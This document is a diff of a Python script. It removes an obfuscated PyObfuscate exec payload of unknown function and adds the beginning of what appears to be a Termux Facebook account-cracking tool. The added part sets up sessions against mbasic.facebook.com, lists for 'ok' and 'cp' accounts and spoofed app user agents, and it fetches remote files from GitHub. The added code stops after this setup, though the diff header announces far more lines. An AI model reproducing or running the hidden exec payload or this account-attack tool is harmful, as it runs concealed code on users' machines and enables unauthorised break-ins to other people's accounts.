@@ -1,5 +1,529 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Thu Mar  9 14:28:25 2023
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'===C7ZOMX3PUP77XPM6LFZPY24OFWOTENONTUMVWYCVKGNFS2KUI2RUNE6OU6BAFXB6EPRBEVZMTW5TB4YFDKXXMMMJSXEEI7BQJPT5KOW4QRZQHD7AK2MTERS7SEGOSPXTJ5XOC6CAOQ3BI7FRLC7VKXLDW7HQ6B6MIKPANPRBMLM3OXV2GQGKLAAAIRLMLWANRA66N6IVG5UWMB6BERZ5QGN4IPA5K4EXMDR77SJSVM6BP5TVGQPHXPMERHCYS7ANTAK5X3QKK7P7BF5AXWTBUYDGLIYZSQHZR52F5M6LGV5HYMQ2QQBTVC2MZBTZO64DVV6BKYCWN63B3MIUFXGUN7HSNBPODG5VNWNWQAQQ4SBOMFIED2TKNYS7QJXYUHXOTZTDXON3Q7JK26XEONS3ARQGZAFXW2C57AURA3INXID7Q6GTMX2I77F6YHYY3VMV3RHOZHBU4SFPBUPL3YBJU3P3SQ6FQ2NJYZO3DJGSFAMTO3BKAMHB7L73V5OHEJSL226UTKQF2GS4PIZBY27GH4ACPRW5CPXS3D3MAYZAE4LXZ4R2WYDEK6SSMNEDS7JU2TWPWFHRMHCVQ4U4JVMBQ3H3CTX7IPYP5ZN76NPPP5VONYNGU4FHUTGOCULRQQUDC7D7X34HZ27S2O5GK5KY7MKU7VFP2AOJBRT5N5DDODAZOHSGHP4NFBL24FIKAPJISUACKNNYTD64MTKGLA3PB5CXWSCBIZ5BXWPBIOHCY2TIG5X7NI4DM5S5RKM4WP7YAQAYSDB2BJEX3TUJFQX7WTGDMKQQUPOHZAHTTMITX47RBO5TIKY7IMAOLH3WV6373N2BDAVE4XGII6TQYCBPAXV4F2XMOO7IB24DS2V6YQXG53U4SMO5GDUL4NH7ZRGVLJIDSCRFACK5THF43TIHYYR2OAUXRSXI657GT3RCNBAVESLBXXEFLVXYGI3XWD6ZY5ZYMUXKCPXLWER3N3XWAB54KXQNZQT2IMCIRLHUNQVC4SS6B3RQIXOXDF4TYGUM5A7JXZIUEMPNSWN7KHHTTV73USWUJKLDONDFE6D7RNIA3WFZSDL73SMUBTCCTX3VCNHKGQZIUGWDFYL4EXXKG6DIGYZYYAOO6IFZLHOTMQXY5DOCK5NX5T75RRTN6B5KCWGDKMIDJKBOH76PLGKUWOEDST6X7TU4TY32PNA5EHUKGQDPMCM2BK55HFIUKI5ZLVLC34X4YIR2J5KQ5LX4W6CLM5Y57YQC6OFUIHAQFP5PXIJIX4DMR2OSCD6GESYGMA6MEHL4ETMT223JD3FLISZFBUF4I73QJMN2QDCF5BBGJNNHIYANACN3PNNUSGMZ4IKP3PX7UXTCZVTZOGYQDVFOEVLLZ4NC4BKWA3TNJOGSYEAIWZIYV6K5DHGIAZWX7ODGGB5OC7SXHGHH3GETOYBKQ5AWOZH62X6FBQLQV6CK7PXAA5IMOTKENAZJGQSE6E6WZADPTVCLUQU3GMQEAHO7GQHCRF2F3RCANT26R4W2O5VTDM5R4INJCGWB35TONMQNSNM5FEDOT7MOAWN5S2L33EHT4S5J74UF5KWD442GHJ5BGBONZRL6AGN3J35ESVMB3YYZJVWFBU2666MPDY3B6R7VAAGP3YF4M43IWUJDPGDBI25PUWAYPM6RYQ2J6KYPHCXOV4HPRLYANL55SB2U2NANHND7SHP7DTQ36JD663FJ75IZD632YVO64AYDAV6B7L6QP2SBY7BVWRZPV3FVNYOVIYV6NG6BNPOZ5VBMDYBT5XLRCYNGDYJSN7R7M45ELXPGB4NPPBE44KG6XYVWV3FCFOBHN5HKITUAMBGUC7GFHMIZ4QLFBCN4ZWKTYZT2VDRBC5A7TNYV6ZCU3TQOYP6DXUNKIXQRXHAWTEC66YDDGQ4V75DA7TXKIHPXWVZODF23SWTU6X2QMWJSBVGL43OKQHYY7XBA3AXGJ2QWVCPLCPE3VQBSQ7YG27PY2QRTELIWBEGCNLIZZ7XAK5RA5KB4NWBTS35LAJUM7TJ2RQU4QEOP6THZ3RVKCWLDAHDE4TMIBBPIOU2U66THR3AGRBDDSQOPR3SD36AAROR2TBEJJGSEWF4I6TL53PHYR3NWRZLXXHFEDACMIDINLQ4HXPVXUOWLVU5JHDESG54Y3ZYLB6GAWZB62VCXSPRNRTU2VAQUS6QZFJ7X6JCVFQDOOMAHFCU7TRX4MRAQ2IQ442A3SFHPBYHY2OA7S7FSXHY5XYF6UN75SPNCFBAQTY7HBU3XDBHEI3FKRI77BANNFTU2RBLJCWK737NUI7ZEZNGJ73CK5Y2ZP77RXZSYYSNN662JLKDPHQ3DDQQZEIQ7NVJRZS3EZSDF2A6J3Q4ICMLW2F2UNTIPYTXEIECQ5FZFHPRE5XOLNBOVYBWVMCYDUZI5A4IJQYF2G5IXL6SWB4NGBMG7DX5SV4FR26ZBBIH4DBAJ67LQX6RY33IKZTJCYAINUPWPMZLEWRMCDU5UYMIC5UPMY7G3XVNJZHP4ELIU6NZIBBNCEX6ATHK3QDQAJUN7SDO73ALLGR7TYHRIGGOKW3X6HPYEHLCT2WSRN6RFG67GQFXLUXEWAX6PLRY5AT7YMNGFPXYH76ZVPA32A2KZ2FFO4AQP3AAEAGPI4RKY4ICERTGAPKB2AI32I5LPGD3PQEOFVQ5O5R6Z4GYTTTS35LOL5AOMYIXXGPE3EDN4AVJFHOPWI2PNGZ7YANJ6RRNX32O7LIFL2FMO7PGKKKAWUBVWZGUOW4ZYHQGOAZPQOKBYAWZPDOWOXS2JLBP6JIFYWT42HGUHAOTAA72BHXP4XJIWZ2LEYYMR35ZV5G7XQL6J7TPFT6LLBV5LVKIMFXMIZ43NDLTJC6BD26YK2MWYL5PH53IVN3WAX2WUML5A7OYGSDZVA3YGP3HTXMYJUOYXXIZBTG5M2RTT32ZRJ4EJ3I3MQZGE72RNLFA5CPD7UIQ6NKF2J7AEMRXCRQEAGECAMJHPWWHCDR4K6BYIQAAM4EX5YCAIOIWCIPYPZDPNVHTB2UTJG7BEMYTSFPZPMFPTM67NRUKEW3DNC72W64RENDTALVZHIP3C3QXCJKKOCE7FV24XEL3AYKIAKOGH5G5IDNYG7CRLN74XRLVA5AYH22XDYYBPPDXJU62GL7R7WL5FMJ6EUMANNEUPYFPBYU7YONUSJXCUYAQJUPMX56EP7FVM2633K5IP37P4V7N3BQOZYHCMCJSDBME35DSJK2NXNTWTFE2YEC4DCYAEK5LQH2JBEZJKEY7XTRMRDASLVQGJMCFCGO6RNYDW7A6YPAQWMQNTXHLQ4DMGVXWDAVMECCYOAM37L2LKYX2CALW7DQGTJIZF6UTB5GEYWJ26PXLSXPJPITN4AORAEXFOAAHAYZ3KG6LHO2D4HOYH2FPZHDKGY3NUUAFXKYKPNY45X5V74MYDI6X5J2YMXJ2NDG45ZN5H3GGFA5POCLCLTADYJALVKK2HWHA54P3PFEN6M4CEZH6TH66HPEPSIEBWFG57EUOBBH3TRCI35YWIJQVMKQXOBCSMAE67ZOLIZZY43HTAUIPJNPKVOWRK3ALY7EQPT4Y4VBENSOSB42G56FBWYPV5QYAE7S7OU65GHYDDBO3FTOP4EXNTZO5JU5SIRBPMPRHYADB7L4R3XV3AGFMEQYYEGA5RQ47CSCYH5SKJFU3PKL2M7P7TNZVMNQWA5HASCXBPDEQPO2FFY2GUXZLS2UZ3XD4TT5NVBLOJBSQD2BF6RBJF6UDFOFAHI5AULKDFWG5QC25N5OZHAV4CQ4BJRROQ56PKDWFHQ767GKSXT7GVTWDJK2NATUBHSGPISYOAI3JII3GINX4XXODLN2AYOQ7GK2GEMJVKEO2MZTHIJ4KTR52FHW4ILKMR2A3PPXHYJCBCYWLNBSPPL63PCFY5CO7WOYBSLBHX5CS5EDBAFRNQY5C65HMVNXNQLH2YCZC27OXEUNJ4DNUWTNVGIMP7EMGA6J625VDGTBUP57N2LOCEUWCYOBUTWK6W6YJOIOVI7RXJ2EZ7BTDL5JPCO2BXQ2DI2M76T7CNZH4O76YTDKD6A5ITZVZDNUR4YXMSIYUC5KJKECDLS4UHTBB2V2XG3XC6G3GCZASDELPQG4GANSFHGG6FXZQMHMQBBQ3JAGZENGZF44DQU5ENACMHKYGOD5GMFDKJVMIJT2TGIHVI35ZFAL43MQQ6IATCCFKDFQIIPGSW6GOHWIOKUHXQFARQ5OUFQXCUU752QKJ2VYQK3IXSQ3TFBTOWDZFEF72MAZMXO3QKJLZQPZZKOBABN6BIWD5EKNQ3EODV7A4RMXOY4B77QGMKSYHT62K46AODAMHMHYZKS3HZFOOKFIYTTAXP5FZJG4WDLF64KPZIX2JNZC5BHAD5OLITDQ42ISIFC7Z2UJLJMXQKUCABALFJ3PZF27UUZ43IFQ5XB6R3OV7HQZVBOP4E7X3O4XN5EWEUFEVVMDJVQQXB767PZEZ7M4RXO7YJNP5PDAYVWUCAYRLEP45CYLAOJN24SZ3WWJYUDB2C422Z3L6AQ2OAQBDIAJJAOC6YLNVEQSWLW3D4LE62KGUQV7FUVPRER4SQHPX5F3IFTCIKQR5IOUJUCV3P7KJVLZ6E5NAWJXWLCJO37LU6AMGFSDODHXBQWJKUDCBGKKYOO4CGTQHM6SVXF7DJ2JDOUWQOSYSX5CQUXF6AVCVLSTQQWDEGK3SKI3H4HFU2NYCVXNCVEN6VJHVCCW7OSE4GSUXPRHQAFZGD4ROYL2E4PPJ2IY4G5JEPVJ6KCBQ6EMQZXC5XUC6TY342KE4SA6Z336VNIMVJWJWVVCZH5XYK7QV6UKU6ATNYKG3ODBWK5ZMAS3H2JNAGAW7UZNZDQFHL7SALKSVEANWUBLGNVPVEA4A4RSM53KWC4EMKU23LFFHDT45DQOGGPMPXDQSEZLKBZGP3MAOL4DBSRQMEWXZ6DR4PZHPI7CMMMECXMUMHXV45DHK3FPKE3S3EVTJCOFFKIMP3S34JK5L4I5BXMABLF6Y57ZLM27LFSEPO6EU6EKSSI5BID6G2PH6YEUJAMDIF2CXX7UGY7DJRLIQRHJA6YHINQHP4IIPQC4OFYSPGWWBCFKJVAIPZQ3TYRKAHA47NIQ5A5NYU4D5FYC7WJ27JDA3D52TE3M2KSIWM6UBUX3AAL7DV4D4KVZNG2JZ5JJIRNDNX6XKPC3NYTBROL27XJEZ7OINLC3RTULWLAB4WUZT43OVQ5LW5QUDLYZS4Y76PLUYSR6OOZSLM3QV5ISX6NO3IOIJFFGPC4LUFLWEX2WLK5HR5C7KVAEZGIIFHRSMU7CBC2OQLU74IP33ZUM4VT4RBMTBMGLIVQR4ICAZPZIZ5ISF4FJPWZV4AXXXL5KGBTXA2VOALRHPJLVPLJJOPRBSTGPKE3J5UGSIRXTKNKD64QG27QA6BIQCMBJBUVAT2I56VUTPXN7RPLOFQPB46DVKGZM7B4ZFFZDV52Y7SDPM2NJMIR27C3EEXNIYU4PRK6KBY4HNNSD72ZQNKB4HPX2UZYR6AS5JUZA4B54VQBEYPT7OLPZQDVAUORXXFRXBABNRNAHD4M2QI5SZBOYSFANYRDWSDAUAQNY4ERRG5IHPWXCKZ5ESR5VNWCMKJ52XOPBAMCNEYTH42GCMM2MIGMESBIXLRBIAO6CJOYPWIGQNYFA574D2GFROYMGYUBCI77J4J5FUR25XZS3FINFVJI5WXMXZ5WCSEGPTT6ADASX3XCY56R7NKQ4TUQ4KN5ZOLHNUAC74QPTM5DC5WR6HDQUIC3GACUODM6S3BZ2XHKVPK4VXYLAPHBTT5MDM4X2WJ4AUIJZNR5K2YU3BMQWVYCNBZIO37DLGGRIILESOLQENTPLVOW3T7KROAIZ2LZWT356E6MBGLVMBJFC5TV4SI4T3T3VJPLJSO75HVVFM53VZJB7MGEDKOHP5BKP76TZ63LNI2N6HHKLSMNB75V44MKADLOJKOFXVFRTN5H4VH7G6KH6ENPJCY3JJ6AKRRZ5VC5GPAQOIMKWUFO434KCKBLMIDIJO7OL7EO6TDXCRNSGHSY3KCAWQVLHC7C56DKMXWR3G7PR5AYP5JDCGRL4ETKLJFSUA54ARHHMZ5J75NOI6ZMVDCCPKDD7TSA5FUHE2RIAC6MRAR62TOPXYF72IGEWFKUZPNELFSLM2JMKUSYZWR5ERVXL34SEOVJNI2CQNZTWP7QJSQZRUSGUKHGDQYEY27TWYVTG5MG6JJ5FU7F2E4DH4PNFA6HXS6RZVEEIXDKQ6H3FXMJF4DFCKAGPPNMANECNE76X7ZY6EDD2JQGWB7B4W4PECIPHUTRIRELFU3G7NBEQIN4XEIGU4L5UP2NRLTONG5NF2LWRP23IE53PE6FV4ST4KZCA6CFM5ARABEFIZFFPDX5KBMDGWBKJ3TLO2EBD4WV6GF46KAIFKOKFNLVEOM5KL434JLAUPMGKVYCLBYH2GLCIYSAH3X64YTQ4K6UGJHDBQPABAHMFLKWCH6BI3BATFGVPAGMX3I4ZB7G7HBMNBPYZBGVXPPITXK52FAKJXCY47Y3J6CVDBISFX4FASY7QVLEID5QMJIYTAODCDM6EIVVNUDRAOPX36EO4RGHHJLHJ7BIBSJI4PJE5HQKQ5LT3F6BNISJAVUDWRGWFIRLJRRHAH3PIKZKENJBDMIBAM3CQ6ARVDUTGUA5TIHRRVZGFZT6BGODIV6IZXLG5CNLTLDKPY72VEGXU6WKTH4XJH4H6DFVPOY37V5ORX2X4O6FB7RQNVIN4KQ7P6BTJ2ZXLTIN6XQTIBV2SNEXBI56YZAASXFWOJGGNZ6Z7KQDLAK5SPDA624MEACLAYT66YZZCCPW5LOSBM2RNBGKGY7WGYAY4V4BQD4TPKSSCA72BNMWBAPMUQCX53EFAMQYZGI5D65R4WRWP5UL6BAWRA5SAAK6RFQAH5AIVPQPIPLCMY4DSWIHKVY75PZPE4IDQETCF3OKNLG4AAKYQPAKAWZEBAW3D2G3W6ZY2K276UYT2QHMUA5TIGZZUOPYGMEJ34GBLQQBF7D7J4VUBLUUKS3QDZTGPYOLR3PKWESNQQYV75EYD5DWR4OGZDEZCFYSSN2PZJJ3UP6PAS3GA7CLMJT5R32PTXA5EQUDQECE357T2JK6PYBXAT6PKGBGSIX3USRHJOG2QPZJ76J2MK76KNRBYFEP256ZTOCASSONN4F54VZRH2H5AUB4HJZNQOBKGPVRWDGDNS4YUGFILDB4PNLRK3DYTQJCGO3CAZCDQ3PGVY4JTQTVAWCD4NUKLDKFULA6IF44W4AFYM6DNAZJTWHT347W3CXEN25BC2HAWN4UCSSTG7ESHCJ73MNNDLC2Z262P4FGQTEMJ45T6FWVNCP6FGWYDXTRQFAFJCCRJOREHO5A4TKWAMDQXAMAD3HSNUSID22K4MDQGGPENFBKJIB3UK4CDXUUDLYYADVMI4KJBU2VABSE4NFDVWJR5I42LZ22X7BIKDUJKYXPGAFGMVOTF5OPPM5OUUXFRLB6A5JUVNJWHEOIOJMWOSBFQWNIK7L4I7AT2IYBXJZAQK3CGQIA22TKSF4DUYV3U24D3MD7VROUACJDAYQ6QJBQMOXMI3QI5EZJM2TABDIHBDCERRSIKTOQE5PPHTRFZVFXXFGJ4ZC6L7BXSODY3CMPC3ANPFYMIRM42X4PN2UFXAE2WGPSF2BUDB4DI4VYOFZX4UGNNJKIOZEADDLAOGPGNCCQB6YKMM5ZPSAP5AF7QRBAO56DAA6GVEYNTVKHN4K7NGF5JZYF7QJSKKJB4NQSQNHW5SLD2TVDF4BN7K2COIFXRYXIQPFMNY5FXMJTYT6LCA6XAIXWAY23GZKRWZ3BCK3DIG53HT2BU3RUR3V5BPJZE7LRISTXQMLRUSZKGOXOOGRAY2T6THNQ5F3P5BB7QG57H2XA7CUP3YCIUMW5YXHWBXRJJRR5KQXKZCVQXJM5XIVQ2YTSOIIGHCWLLHO7KN7ZIEY5WYJDXCORQOJQQSCGFXRYMI3R2EZD7ZZPEBMKWGNXRVVPOXEQYCDXILHOWFA2LGPZJI3X5C2ILY6WMA3SAQQ5X6JAZEICIDIUVULOWWQP666A7JD3UGCCRMR4QRE4OMQTAJPWY7YJXQTLSKXNPXQBSU7RKDEW5KGP7JYZAUYB33PU6LVNCVANLI54D5NQOLRFANKQSCJY4VPCIAL23WLB7CYX53FTFBZJDPCA5FI3ZZP3BFYBTMBQNAAHB6P25JWGJMYNPDAOHJNKTRJYEHASVU56A6A5SQJO63EDWMSRT4GKMACD33R55B2EN6GKEHJALBTTRYJQEMYO75TTJCI6UYCE3GPZPAHPCJL736FQYTJ22AJ5F4K24DXXIKHE554YG5UBBFIVREM2LZZEDSKWRO23VW5ECBUB5V6SY5ISXUZTPUMJCSU2IMWZD6KKDP2RT6ZDIWJPIVUYU6D7AIIDSHYODMLMEFMH34AIUFM6GJFYQX3BIF4XVDE7HLI5XTS6AY6D7D52G2HR5RZOE7GBYADIU7DWS43E56MA6OPLRENBMVGLDHBWV7FPV5UR4GIPOGMGJZVJ4APOIYPPW6ZN4E4QQ6QDJ7V26PCDXC6FRWO6EQDNZRIFDCSEBZCLOYWDWFHTB7VUC4ZHXSBXLBZPMQGZXNZP7B4CCZAGQA5NHU3F4A2YRAB7UE7OHDWQDLASUVI72ICLPYC3Q522YRDM2ZTDWE4KIYY32NOJTAEXFACF4MPVV6LJVAD3TED4FNL5B3FYSWZPJYUNOIEY6OQ3HQ3JJBD4ZNP2YKIY3OSPRCMEXFHVBSD7WYYTCYEP2ZONSYGNALUKAJIJAP4X25DA6YUIHGGIAVL4R7I5HPR7PZQB2ZSVUOHATGV5EX3MVX5APC56O7BF4O7OHNXMAMXX7ZHWER2FPNK2FIW2VJK3YP4YS5GFHOOV35BPJA6KMAOJZG5BWZTN23B5CBVUEQ7U27KAGO7ES7QKMYGKQUKNDNBIOPIWDGEMUOFWXTSHHAFE6NW4J5VCCAZOGE5564N5MGHVEOYTJRAMRDYZTUOBEJCT2MYKVGWBXNPT3D5JTZQDREO6RFDZU3TQGHJPXHWMYEIPGM74T2HPK2PRLUXZ23MWUXOEA7DAPXJMARRSULAGNQ3BYFNEAN6ENXBR7MLI52ADWI6473SPXRUTROAXEGKZDU5YQMPLXT2FYBZPTQECEG6J43LVZKROR6WY5UMCMDKCRMJWC6YA4NCSIEKM5MYCOOXN2B3LJY4HAQOCRPW746AJMGTNXJPHMFRIUNI3AXS2WQDENXL5JQB5PQJDAVW5ZVLH6D44LRFMJAIRQY2LZDECYWLM2PXF3MHIEBPWTQAZBUFSYGK2XSNBIF7Z7F4SSXPAGSMRFMYAHED7Q3KPAPKBM3H5G5SYU4JH5HPO3UT6MXIT4JV57VICK4JVFG4AQRY3CHOBHH7AMVKX5ROT5Y4JY5NACUXUG5LIY33JEZIPHIRHOBLSEIOWK55KADOOUID7VK4YI7YWMLN25UOXUT5AEWRGDIQ7NBZNOUFZC7AQ6JRAAEFZX7IDXN4MBHKS2IFZK47CHXBMDFMSBBHNC2ZBVTVRP462FDLAG346BQUFCWL3ZUTHG37TFSAA3HNKXSJCX43CGLIM5E2OPWGMQQV4QQQWXQ7MMUMJY3NJA7ZSEIUQRDOBPBDDI7KENZRWB53HKJUXWER44G6ONBHD5MA4YDES4SAILDE7NAOMM3E37A6ZA6MIYUXXU2ZUWURMSAMORUARX2SRBH3S6X24SBJDXYY3ARDDAJU5BBMWPVHPFR455OGCMCBRAWK3KU4ZIIJ33IQE2QMB5MRBBZN76TY7FP67TNUKZV2WN2WAHBGTW5JROV2G67BSL4M3KJKOXCIWTK4IOMEXUI7F2TNH7IMPRF44DMX4MI74KPYWG4IMFVCW53KU66IYL3JL3VMABXCKRR3IIOI7UVRYZDA72FQAY36EPSQIKHGSFS3O6WXW5M2T4WVT76E3BW6D7LLSSNDPAF4KAYEE65KHLIH5T7JJJIMVKSZ6VJVIALKI37ACHRONEIJYOFPIL7Y3P55S4LV4EVLHIEDJO3YXGHT6UDCCJO2BTAO2D2XSAEQ34LOQN6N3VLRPGJK5AYLG7Z42YYHYER5IRDKJTDIVJ3AJSO37X5YLSXXYGPUA6R4DVIRT7YPZT2GPDBU3PEZFMCEU2MJDIMGO2BT6H4IQZRGW3TESXYKGJO2RV53M7QWBC62O4VNMJSWAHI3QFLL4M6GIRCP7GUB43YKXMYENCJI7HG6KYE2HC6DCQ3SWZM7NUJAI3UWLMTCGYISIGQM6ESUDBI7RUNXUXAXJWMCWLW7F3SOW6LTKGL2NOWDBJRBL426374BYDTDZ5R4ZWWNMEHFDDDC7OV5V7CYMR4LJEXYBCFSM26JYVHCFNGGTIO26K4ETTIFIWW5TIFCH3PJJWRIB3AQZDOZ2ZB4555K5YELD4IVSWCH3DG7HTR3NA5UMKHN5JVH4U4RHLE2MZYCMPBASNTYRI64VHDWQSDR6OLPHXASE5RPRUSPOJC2K3YBUADMUG2NNZXZKTPUPRYP73GNRTDLF2RITYNROWX74SVD3XN2BXN4JIBC7NX6AEWDY6LYGBPBA6QZZHSTNUM5BCC4IWPAEHR6UNGOKRCNLCTHV643ND4US76CE3X5FAFX7RKBGVAFRVT3FJCRI6NU3XRMLU3MVPPRPWAGTO4MO7KW3QHMPEJOJ2OHLR5SE4G6H5ZEZFKIKSEBHFN2TMLU2VDF5K5CPZDU3MGZ4ESN344XIQBKVFNDYJCVTXRIZX5H3MUWKFZNLFN4GFWHS2YWG7OFSPBF3XHVL2DPFTHF56LRD2JGKSBSSG4FLBCDO2RLEZP5MCGTB2KROXEYLS75ESZTU53J4TZT6IBE7JJIMZQJBE653YIJZXWJX4XKEXOA66SK2IDJRKP2R4XPU7S3K64TTE2F7R2VE6J7GKQLUL4GKM2KDLCBSBFBPCING3YSRQILTGQX3UTZVPH3EUWDWC7HNHJ4MXLI2MNFS7SONZ3RXG3GSFASSGNVDH3JOSP53SZZXIH4DUDCT6VP3MCP4ETYSULRYL64SZYB3NEPPDDZGHVSHZU5IMECQ4TLRFMDYTDJHRZZUHSTL5WZG333SOKPJHPUD7RFDOHHJ6WW7BIQ4E7PJKMIQMRCUX4LH5JEFVRRLF6SWLNECTHWR3W5OZ2ZUM3MYO6GNPYNV7O4LGNQFI6FE4O7QMGWIUPC4QXKNR52UF6PMGZP6LN4OUG5HIOQEOFMFCZN5HKK2Q7NJNV66N7NKKO3Y3C7RZHNSQQHH4DS4EGLS3DTEID2F5FWI2YEXPCEFHQKHMO5FIGE53TDZ7MMH34G7FZB24H3YRIWKLUUV5PPNZDNTNZ5IY3BNS5JIMDHIHFKYWHS5CZFGGC4YRVISA7A3HMFLYG5JBV3T3ERLSJIWZOTVV4SF5OGFMXNW6CWWDLYEVXQZI6535KCTQ7GHJVDXKBFYGYLWCV5VY3UQ5ZBWTQCKELEQIN5AZZB7QLQRZ2NAVF2X65RQBWAHJXVW3TUOUAJWW3436Y5QQPKQPQABJI7PE2A7LOSSFJEUO35AVHODGAKY5XI2WB7ZEGGBJ5XCFX3VHG2L6WUPSE7ARIVP2OU343N36YBWHGYMILIWRMHKI3ZU2NN3Y6KF6SZJBTXF55FWAV7XRKOOMXDMCEMDZ5NEDSHVJAFNGTIEWOCH2PPC24KLSGPUT36MJ2LN7HOEK4EDPFLEE5QLWT4ZKM64JR36EFLEHTGSE7OBE6VP3PJJP4LRS3VFGT5QS67JVSY2ZE3P7UOYRZDDCDHCLKJLOL6DMST6E3WY63IXQGVNW46AUVTTVY4KMF53K3CF3HR5ZPF7FQYYXW5SPZ6UA5KDEYBRPURDWG7VW36JIB62KVDMNO2FWIZ4HGRUA3KCAFF3HCJ3ZSX437KDVTP4ZMAPBEN7MMI5ZFJ4QXLPZBBJOFPYUS5W5SKXTSDHVMJK76DCN2NI7IVAY73XSFWLLC532TUBQIX4HM3XRPZCWFL66QNUX37UZET5BYVXYMHIIZSB5D4GXFPRPNUB4NLXIEXJXPOE43ZXHOEGKQ22L25XVQTNUJKDMEXP5F5YNS635ABRPTEUJRYTRP6MBK4J7WJVLXBKHWPLSRHOHPEPSSDN5VTCK2EXPUWP7V6UMWIDSAFYFHPW4AROAGHNPSSL5N7U6RMZEKPEPRMLTU2GKIH4NSEL7EPPPPGMT5T7LJPJUEXSS7IJBPM3UCF5XGJXG3JMCW53WKW36KA572AOZRIN2V4WNNJ7BPHXDXYDNU35W6LWTUTVYJW6MLFPL34BTN4W6GRMXZFOCPWAMYI5BMHX6J74QHYDAX6UJEFXV66G6BZCWMPJBHG4VLENUSJAVLNCWNFALV6HB4PBZUPF44OM62XLXH2MBLPHCXGTUMZ6DIJFGLV7T6BCGWQY4ZUWBQVHP27WBWQ43HO37YQ6R2AN2RWOVE4JT6XG2TXYZUWB233WWFRYW2S2MRZU3G6GBRDRV7NJ7VEHN4B2NPVWD6CLVXFINNGYZP37WFDLJP3V4O4L44AP4EMK6DSDHU4XE3X2A65XE6YOHTZWZEOGTHPIK52NJ3KZ5UHJV57KI7ZKXEE3T7PSUUFHZJRKHP7XQMJARHDSLPTO3ATYMVMYY2XU5S35TMTWZH3N2IUUEZ4B5Z56TKDFYYMO462Q3FPJK5WEOR3ZCKL2M67OL3KWP3H6OSP42Z5ISSWJMTVUPSI2L2TVME57VT7GOPIVPXL4PN4Z777ZLX777P64377737W75X2P2645SRAO463PQEJ3IW45X4AV5OQQR3MIE2CJEAAVXAQ4WTCTWR4SFKEMLWLWJSG3BOCP'))
+#coding=utf-8
+#!/usr/bin/python3
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
+from random import randint
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from urllib.parse import quote
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
+from random import randint
+r1=requests.get("https://github.com/AyeshaKing/File1/blob/main/ApprovemXD.txt").text
+import requests, re, os, time
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ADIabba
+from concurrent.futures import ThreadPoolExecutor as Adiabba
+from datetime import datetime
+from bs4 import BeautifulSoup
+from multiprocessing.pool import ThreadPool
+import platform,base64
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from concurrent.futures import ThreadPoolExecutor
+try:
+	import os, storage, requests, mechanize, bs4, futures
+except ImportError:
+	os.system('termux-setup-storage')
+	os.system('clear')
+	os.system('pip install requests')
+	os.system('pip install mechanize')
+	os.system('pip install bs4')
+	os.system('pip install future')
+	os.system('clear')
+try:
+	import requests
+except ImportError:
+	print('\n [âœ“] installing requests !...\n')
+	os.system('pip install requests')
+try:
+	import concurrent.futures
+except ImportError:
+	print('\n [âœ“] installing futures !...\n')
+	os.system('pip install futures')
+try:
+	import bs4
+except ImportError:
+	print('\n [âœ“] installing bs4 !...\n')
+	os.system('pip install bs4')
+if not os.path.isfile('.agents.txt'):
+	os.system('curl -L https://github.com/MARKSINGH1/King.py.git/files/main/.agents.txt > .agents.txt')
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+	if n < 0 or n > 12:
+		exit()
+	nTemp = n - 1
+except ValueError:
+	exit()
+if not os.path.isfile('/sdcard/Download/python_13.1'):
+	n = random. randint(11111,99999);x = open('/sdcard/Download/python_13.1', 'a');x.write(str(n));x.close()
+with open(".agents.txt") as funk:
+	liners = funk.readlines()
+	
+ok = []
+cp = []
+id = []
+user = []
+num = 0
+loop = 0
+_silet_koceng_  = requests.Session()
+url_mb = "https://mbasic.facebook.com"
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5; rv:103.0) Gecko/20100101 Firefox/103.0 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
